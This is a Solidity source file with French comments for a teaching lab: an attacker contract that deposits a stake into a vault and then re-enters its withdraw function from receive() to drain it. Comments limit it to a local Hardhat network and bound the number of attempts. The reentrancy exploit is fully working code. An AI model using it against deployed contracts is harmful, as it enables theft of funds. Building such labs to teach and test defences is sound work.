// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICoffre {
    function deposer() external payable;
    function retirer() external;
}

/// @title Contrat attaquant de laboratoire (« Modou » dans le cours)
/// @notice Réseau Hardhat local uniquement. Scénario en deux temps (cahier des charges §6.1) :
///         1. deposer() : l'attaquant dépose sa mise dans le coffre ;
///         2. attaquer() : il appelle retirer(), puis receive() rappelle retirer()
///            tant que le coffre contient au moins la mise.
///         Les réentrées passent par try/catch : contre un coffre corrigé, la tentative
///         échoue proprement et le retrait légitime de la mise aboutit quand même (§6.3).
contract Attacker {
    ICoffre public immutable coffre;
    address public immutable proprietaire;
    /// @notice Borne de sécurité sur le nombre de tentatives de réentrée.
    uint256 public immutable maxTentatives;

    uint256 public mise;
    uint256 public tentatives; // tentatives de réentrée
    uint256 public echecs;     // tentatives bloquées par le coffre

    /// @notice Émis à chaque tentative : numéro et solde du coffre juste avant.
    event Reentree(uint256 numero, uint256 soldeCoffreAvant);
    /// @notice Émis quand le coffre refuse la réentrée.
    event ReentreeBloquee(uint256 numero, bytes raison);

    modifier seulementProprietaire() {
        require(msg.sender == proprietaire, "proprietaire seulement");
        _;
    }

    constructor(address coffre_, uint256 maxTentatives_) {
        coffre = ICoffre(coffre_);
        proprietaire = msg.sender;
        maxTentatives = maxTentatives_;
    }

    function deposer() external payable seulementProprietaire {
        require(msg.value > 0, "mise nulle");
        mise = msg.value;
        coffre.deposer{value: msg.value}();
    }

    function attaquer() external seulementProprietaire {
        coffre.retirer();
    }

    receive() external payable {
        if (msg.sender != address(coffre)) return;
        if (tentatives >= maxTentatives) return;
        if (address(coffre).balance < mise) return;

        tentatives += 1;
        uint256 numero = tentatives;
        emit Reentree(numero, address(coffre).balance);
        try coffre.retirer() {
            // réentrée réussie
        } catch (bytes memory raison) {
            echecs += 1;
            emit ReentreeBloquee(numero, raison);
        }
    }

    /// @notice Renvoie les fonds du contrat attaquant à son propriétaire.
    function recuperer() external seulementProprietaire {
        (bool ok, ) = proprietaire.call{value: address(this).balance}("");
        require(ok, "envoi echoue");
    }
}
